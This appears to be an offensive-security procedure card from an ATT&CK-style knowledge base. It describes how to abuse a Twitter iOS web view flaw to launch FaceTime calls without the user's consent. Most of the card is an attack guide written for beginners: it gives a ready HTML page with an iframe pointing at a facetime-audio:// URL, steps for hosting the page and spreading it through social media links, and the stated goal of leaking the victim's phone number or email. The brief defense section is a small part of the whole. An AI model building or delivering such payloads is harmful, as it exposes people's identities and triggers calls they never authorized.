---
id: proc-facetime-iframe-001
tags:
  - url-scheme
  - iframe
  - facetime
  - webview
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - iOS
  - Web (WebView)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:28:44.712Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Embed-FaceTime-URL-Scheme-in-Iframe

## Summary

This procedure creates a malicious HTML page with an embedded iframe that uses a FaceTime URL scheme to automatically launch an audio call when loaded in an iOS web view, bypassing user permission prompts.

## Description

In the context of the Twitter iOS app vulnerability, the iOS web view processes custom URL schemes (like facetime-audio://) embedded in iframes without validation, allowing attackers to invoke native apps silently. This leads to unauthorized calls that reveal the victim's FaceTime-linked email or phone number. The procedure involves crafting a minimal HTML file and hosting it for delivery via social media links. Prerequisites include basic web hosting and knowledge of iOS URL schemes.

## Requirements

1. Web server to host the HTML file (e.g., local server or public host like GitHub Pages)
2. Target FaceTime contact (email or phone number, e.g., guillaume@binaryfactory.ca)
3. iOS device for testing (Twitter app installed with FaceTime enabled)

## Defense

Defensive measures and detection strategies:

- Disable auto-launch of URL schemes in web views by implementing JavaScript interception or sandboxing in apps
- Monitor for unexpected native app invocations from web content
- Educate users on avoiding suspicious links in apps like Twitter

## Objectives

1. Create payload that triggers FaceTime without interaction
2. Host payload for easy delivery via links
3. Leak victim caller ID upon execution

## Instructions

### Step 1: Create the Malicious HTML File

**Context**: Build a simple HTML document containing an iframe with the FaceTime URL scheme as its source. This exploits the web view's automatic handling of custom schemes.

Save the following as facetime.html:

```html
<!DOCTYPE html>
<html>
<head><title>FaceTime Test</title></head>
<body>
<iframe src="facetime-audio://guillaume@binaryfactory.ca"></iframe>
</body>
</html>
```

> This HTML, when loaded, causes the iOS web view to parse the iframe src and launch FaceTime Audio to the specified email without alerts.

### Step 2: Host the HTML File

**Context**: Make the file accessible via HTTP so it can be linked in Twitter.

Upload to a web server and note the URL (e.g., http://binaryfactory.ca/urlschemes/facetime.html).

> Expected: Page loads normally in browsers but triggers FaceTime in iOS Twitter web view.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[url-scheme]]
- [[iframe]]
- [[facetime]]
- [[webview]]
